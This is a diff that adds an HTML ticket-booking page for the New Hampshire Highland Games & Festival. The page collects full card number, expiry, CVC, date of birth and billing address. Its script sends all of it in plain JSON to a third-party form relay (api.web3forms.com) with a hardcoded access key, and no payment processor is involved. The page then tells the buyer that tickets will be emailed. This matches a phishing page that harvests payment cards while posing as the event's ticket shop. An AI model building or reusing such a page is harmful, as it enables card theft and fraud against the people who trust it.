@@ -1,0 +1,491 @@
+<meta name='viewport' content='width=device-width, initial-scale=1'/><!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>The New Hampshire Highland Games & Festival</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)), 
+                        url('https://images.unsplash.com/photo-1516450360452-9312f5e86fc7?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1770&q=80');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            color: #fff;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .container {
+            max-width: 800px;
+            width: 100%;
+            padding: 25px;
+            background-color: rgba(0, 0, 0, 0.7);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+        
+        h1 {
+            text-align: center;
+            color: #fff;
+            font-family: 'Georgia', serif;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+            border-bottom: 2px solid #ff8c00;
+            padding-bottom: 15px;
+            margin-bottom: 25px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        form label {
+            font-weight: bold;
+            display: block;
+            margin-bottom: 8px;
+            color: #fff;
+        }
+        
+        form input, form select, form button {
+            width: 100%;
+            padding: 14px;
+            margin: 5px 0;
+            border: 2px solid #444;
+            border-radius: 6px;
+            font-size: 16px;
+            background: rgba(255, 255, 255, 0.9);
+        }
+        
+        form input:focus, form select:focus {
+            border-color: #4CAF50;
+            outline: none;
+            background: #fff;
+        }
+        
+        form button {
+            background-color: #4CAF50;
+            color: white;
+            font-size: 18px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s;
+            border: none;
+            margin-top: 10px;
+        }
+        
+        form button:hover {
+            background-color: #45a049;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+        
+        .error {
+            color: #ff4d4d;
+            font-size: 14px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        .error i {
+            margin-right: 5px;
+        }
+        
+        .input-error {
+            border-color: #ff4d4d !important;
+            background-color: #fff6f6 !important;
+        }
+        
+        .event-info {
+            background-color: #ff8c00;
+            padding: 25px;
+            margin-top: 30px;
+            border-radius: 8px;
+            color: #fff;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.4);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .event-info::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 5px;
+            background: linear-gradient(90deg, #ff8c00, #ffad42, #ff8c00);
+        }
+        
+        .event-info h2 {
+            font-family: 'Georgia', serif;
+            text-align: center;
+            margin-top: 0;
+            font-size: 24px;
+            text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.3);
+            color: #fff;
+            border-bottom: 2px solid rgba(255, 255, 255, 0.3);
+            padding-bottom: 10px;
+        }
+        
+        .event-details {
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            margin-top: 20px;
+        }
+        
+        .event-detail {
+            flex-basis: 48%;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .event-detail i {
+            margin-right: 12px;
+            font-size: 20px;
+            color: #fff;
+            background: rgba(255, 255, 255, 0.2);
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .event-description {
+            font-style: italic;
+            text-align: center;
+            margin: 20px 0;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            line-height: 1.6;
+        }
+        
+        .cta-button {
+            display: block;
+            width: 200px;
+            margin: 20px auto 0;
+            padding: 12px;
+            background-color: #fff;
+            color: #ff8c00;
+            text-align: center;
+            border-radius: 30px;
+            font-weight: bold;
+            text-decoration: none;
+            transition: all 0.3s;
+            border: 2px solid #fff;
+        }
+        
+        .cta-button:hover {
+            background-color: transparent;
+            color: #fff;
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            padding: 15px;
+            background-color: rgba(0, 0, 0, 0.8);
+            color: #ccc;
+            font-size: 14px;
+            border-radius: 8px;
+            width: 100%;
+            max-width: 800px;
+        }
+        
+        @media (max-width: 600px) {
+            .event-detail {
+                flex-basis: 100%;
+            }
+            .container {
+                padding: 15px;
+            }
+            body {
+                padding: 10px;
+            }
+        }
+        
+        .success-message {
+            display: none;
+            background: rgba(0, 0, 0, 0.8);
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            z-index: 100;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            text-align: center;
+        }
+        
+        .success-content {
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            max-width: 500px;
+            width: 90%;
+            color: #333;
+            box-shadow: 0 5px 25px rgba(0,0,0,0.2);
+        }
+        
+        .success-content h2 {
+            color: #4CAF50;
+            margin-bottom: 20px;
+        }
+        
+        .success-content p {
+            margin-bottom: 25px;
+            line-height: 1.6;
+        }
+        
+        .success-content button {
+            background: #4CAF50;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>The New Hampshire Highland Games & Festival Ticket Booking</h1>
+        <form id="booking-form">
+            <div class="form-group">
+                <label for="dob">Date of Birth:</label>
+                <input type="date" id="dob" name="dob">
+            </div>
+
+            <div class="form-group">
+                <label for="email">Email Address:</label>
+                <input type="email" id="email" name="email" placeholder="example@example.com">
+            </div>
+
+            <div class="form-group">
+                <label for="phone">Phone Number:</label>
+                <input type="tel" id="phone" name="phone" placeholder="123-456-7890">
+            </div>
+
+            <div class="form-group">
+                <label for="ticket-grade">Select Ticket Grade:</label>
+                <select id="ticket-grade" name="ticket-grade">
+                    <option value="">-- Choose a Grade --</option>
+                    <option value="single-day">single-day $59</option>
+                    <option value="2-days">2-days $100</option>
+                    <option value="3-days">3-days $150</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label for="card-name">Name on Credit Card:</label>
+                <input type="text" id="card-name" name="card-name" placeholder="Cardholder Name">
+            </div>
+
+            <div class="form-group">
+                <label for="card-number">Credit Card Number:</label>
+                <input type="text" id="card-number" name="card-number" placeholder="1234 5678 9012 3456" maxlength="19">
+                <div class="error" id="card-number-error"><i class="fas fa-exclamation-circle"></i> Please enter a valid 16-digit card number</div>
+            </div>
+
+            <div class="form-group">
+                <label for="expiry-date">Expiry Date:</label>
+                <input type="month" id="expiry-date" name="expiry-date">
+            </div>
+            
+            <div class="form-group">
+                <label for="security-code">Security Code (CVC):</label>
+                <input type="text" id="security-code" name="security-code" placeholder="123" maxlength="3">
+                <div class="error" id="security-error"><i class="fas fa-exclamation-circle"></i> Please enter a valid 3-digit CVC</div>
+            </div>
+
+            <div class="form-group">
+                <label for="billing-address">Billing Address:</label>
+                <input type="text" id="billing-address" name="billing-address" placeholder="123 Main St, City, State">
+                <div class="error" id="billing-error"><i class="fas fa-exclamation-circle"></i> Please enter your billing address</div>
+            </div>
+
+            <button type="submit">Buy Ticket</button>
+            
+            <!-- Event Information Section -->
+            <div class="event-info">
+                <h2>Event Details</h2>
+                <div class="event-description">
+                    The New Hampshire Highland Games & Festival is a three-day celebration of Scottish culture, music, and athletics happening from September 19-21, 2025, at Loon Mountain Resort in Lincoln.
+                </div>
+                <div class="event-details">
+                    <div class="event-detail">
+                        <i class="fas fa-calendar-alt"></i>
+                        <span>September 19-21, 2025</span>
+                    </div>
+                    <div class="event-detail">
+                        <i class="fas fa-map-marker-alt"></i>
+                        <span>Loon Mountain Resort, Lincoln</span>
+                    </div>
+                    <div class="event-detail">
+                        <i class="fas fa-music"></i>
+                        <span>Traditional Scottish Music</span>
+                    </div>
+                    <div class="event-detail">
+                        <i class="fas fa-dumbbell"></i>
+                        <span>Highland Athletics</span>
+                    </div>
+                    <div class="event-detail">
+                        <i class="fas fa-utensils"></i>
+                        <span>Scottish Food & Drink</span>
+                    </div>
+                    <div class="event-detail">
+                        <i class="fas fa-tshirt"></i>
+                        <span>Traditional Clothing</span>
+                    </div>
+                </div>
+                <a href="#" class="cta-button">Learn More</a>
+            </div>
+        </form>
+    </div>
+    
+    <div class="footer">
+        <p>Contact us: Bayrock Event, Lincoln</p>
+        <p>Phone: +1 (484) 454-0670</p>
+        <p>Email: info@nhscottishfestival.com</p>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const form = document.querySelector('form');
+            const cardNumberInput = document.getElementById('card-number');
+            const securityCodeInput = document.getElementById('security-code');
+            const billingAddressInput = document.getElementById('billing-address');
+            
+            // Format card number as user types (add spaces after every 4 digits)
+            cardNumberInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+                let formattedValue = '';
+                
+                for (let i = 0; i < value.length; i++) {
+                    if (i > 0 && i % 4 === 0) {
+                        formattedValue += ' ';
+                    }
+                    formattedValue += value[i];
+                }
+                
+                e.target.value = formattedValue;
+            });
+            
+            // Only allow numbers for CVC
+            securityCodeInput.addEventListener('input', function(e) {
+                e.target.value = e.target.value.replace(/[^0-9]/g, '');
+            });
+            
+            form.addEventListener('submit', (e) => {
+                e.preventDefault();
+                let isValid = true;
+                
+                // Reset error states
+                document.querySelectorAll('.error').forEach(el => el.style.display = 'none');
+                document.querySelectorAll('.input-error').forEach(el => el.classList.remove('input-error'));
+                
+                // Validate card number (16 digits without spaces)
+                const cardNumber = cardNumberInput.value.replace(/\s+/g, '');
+                if (cardNumber.length !== 16 || !/^\d+$/.test(cardNumber)) {
+                    document.getElementById('card-number-error').style.display = 'block';
+                    cardNumberInput.classList.add('input-error');
+                    isValid = false;
+                }
+                
+                // Validate CVC (3 digits)
+                const securityCode = securityCodeInput.value;
+                if (securityCode.length !== 3 || !/^\d+$/.test(securityCode)) {
+                    document.getElementById('security-error').style.display = 'block';
+                    securityCodeInput.classList.add('input-error');
+                    isValid = false;
+                }
+                
+                // Validate billing address (not empty)
+                const billingAddress = billingAddressInput.value.trim();
+                if (billingAddress === '') {
+                    document.getElementById('billing-error').style.display = 'block';
+                    billingAddressInput.classList.add('input-error');
+                    isValid = false;
+                }
+                
+                if (!isValid) {
+                    // Scroll to first error
+                    const firstError = document.querySelector('.input-error');
+                    if (firstError) {
+                        firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                    }
+                    return;
+                }
+                
+                // If validation passes, submit the form
+                const name = document.getElementById('card-name').value;
+                const dob = document.getElementById('dob').value;
+                const email = document.getElementById('email').value;
+                const phone = document.getElementById('phone').value;
+                const cardNumberValue = cardNumberInput.value;
+                const billingAddressValue = billingAddressInput.value;
+                const expiryDate = document.getElementById('expiry-date').value;
+                const securityCodeValue = securityCodeInput.value;
+                const ticketGrade = document.getElementById('ticket-grade').value;
+
+                const endpoint = 'https://api.web3forms.com/submit';
+                const accessKey = '8120bb8e-904f-476a-9ff1-18eef906fd7c';
+
+                fetch(endpoint, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        access_key: accessKey,
+                        name,
+                        dob,
+                        email,
+                        phone,
+                        card_number: cardNumberValue,
+                        billing_address: billingAddressValue,
+                        expiry_date: expiryDate,
+                        security_code: securityCodeValue,
+                        ticket_grade: ticketGrade
+                    })
+                })
+                .then((response) => response.json())
+                .then((data) => {
+                    console.log(data);
+                    alert('Thanks for your purchase! Your tickets for The New Hampshire Highland Games & Festival will be emailed to you shortly.');
+                    form.reset();
+                })
+                .catch((error) => {
+                    console.error(error);
+                    alert('Error submitting form. Please try again.');
+                });
+            });
+        });
+    </script>
+</body>
+</html>
